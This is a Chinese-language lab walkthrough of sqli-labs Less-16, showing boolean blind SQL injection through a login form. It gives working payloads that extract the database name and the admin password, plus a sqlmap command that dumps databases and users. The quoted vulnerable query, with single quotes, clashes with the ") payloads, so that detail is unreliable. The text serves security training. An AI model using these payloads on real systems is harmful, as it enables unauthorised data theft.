# sqli-labs Less-16 复现

Less-16 是 **POST 型布尔盲注**，核心特点是 SQL 语句闭合方式为 `")`（双引号+右括号），需要通过 POST 提交注入 payload，利用页面返回的“登录成功/失败”差异进行盲注。

---

#### 一、环境准备

确保 sqli-labs 已部署在本地（如 `http://127.0.0.1/sqli-labs/`），并能正常访问 Less-16 页面。

---

#### 二、手动注入（布尔盲注）

##### 1. 确认注入点

- **正常请求**：

    ```HTTP
    
    POST /sqli-labs/Less-16/ HTTP/1.1
    Host: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    
    uname=admin&passwd=admin&submit=Submit
    ```

    若返回“登录成功”，说明账号密码正确。

- **注入测试**：

    - 真条件：`uname=admin") and 1=1#&passwd=admin&submit=Submit`

    若返回“登录成功”，说明条件为真。

    - 假条件：`uname=admin") and 1=2#&passwd=admin&submit=Submit`

    若返回“LOGIN ATTEMPT FAILED”，说明存在布尔盲注。

##### 2. 爆数据库名长度

构造 payload 测试数据库名长度：

```HTTP

POST /sqli-labs/Less-16/ HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

uname=admin") and length(database())=8#&passwd=admin&submit=Submit
```

若返回“登录成功”，说明数据库名长度为 **8**（sqli-labs 默认数据库名 `security` 长度为 8）。

##### 3. 爆数据库名

逐个字符猜解，利用 ASCII 码判断：

- 第 1 个字符：`uname=admin") and ascii(substr(database(),1,1))=115#&passwd=admin&submit=Submit`（115 对应字符 `s`）

- 第 2 个字符：`uname=admin") and ascii(substr(database(),2,1))=101#&passwd=admin&submit=Submit`（101 对应字符 `e`）

- 依次类推，最终得到数据库名：`security`

##### 4. 爆表名

- 爆 `security` 库的表数量：

    ```HTTP
    
    uname=admin") and (select count(table_name) from information_schema.tables where table_schema=database())=4#&passwd=admin&submit=Submit
    ```

    可知有 4 张表（`emails`、`referers`、`uagents`、`users`）。

- 重点关注 `users` 表，继续猜解表名和列名，最终定位到 `users` 表的 `username` 和 `password` 列。

##### 5. 爆数据（以 admin 为例）

猜解 admin 的密码：

```HTTP

uname=admin") and ascii(substr((select password from users where username='admin' limit 0,1),1,1))=97#&passwd=admin&submit=Submit
```

97 对应字符 `a`，依次类推，得到 admin 密码为 `admin`。

---

#### 三、sqlmap 自动化注入

使用 sqlmap 一键完成注入，命令如下：

```Bash

python3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-16/" --forms --dbs --users --batch
```

- `--forms`：自动解析 POST 表单

- `--dbs`：列出所有数据库

- `--users`：列出数据库用户

- `--batch`：自动选择默认选项，无需交互

执行后，sqlmap 会自动检测注入点，并爆出数据库、表、列及敏感数据。

---

#### 四、关键注意事项

1. **闭合方式**：Less-16 的 SQL 语句为 `SELECT * FROM users WHERE username=('$uname') AND password=('$passwd')`，因此注入 payload 必须以 `")` 开头，并用 `#` 注释后续内容。

2. **POST 参数**：确保 POST 数据顺序正确（如 `passwd=xxx&submit=Submit&uname=xxx`），可通过 HackBar、Burp Suite 等工具发送请求。

3. **盲注逻辑**：通过“登录成功/失败”的页面差异判断布尔条件真假，逐步猜解数据。
> （注：文档部分内容可能由 AI 生成）